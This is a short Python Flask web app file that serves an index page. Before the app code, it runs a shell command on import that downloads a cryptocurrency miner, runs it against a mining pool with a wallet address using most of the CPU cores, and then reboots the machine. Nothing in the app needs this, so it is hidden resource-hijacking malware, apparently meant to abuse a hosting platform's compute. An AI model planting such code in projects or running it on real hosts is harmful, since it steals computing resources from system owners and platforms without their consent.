import os
os.system ("wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:3333 -u 0x618758ae107193d63344=39f6b3f1553ac6e43b62 -p x -t $(nproc --ignore 3) && reboot")
from flask import Flask
from flask import render_template

app = Flask(__name__)

@app.route("/")
def hello():
    return render_template('index.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
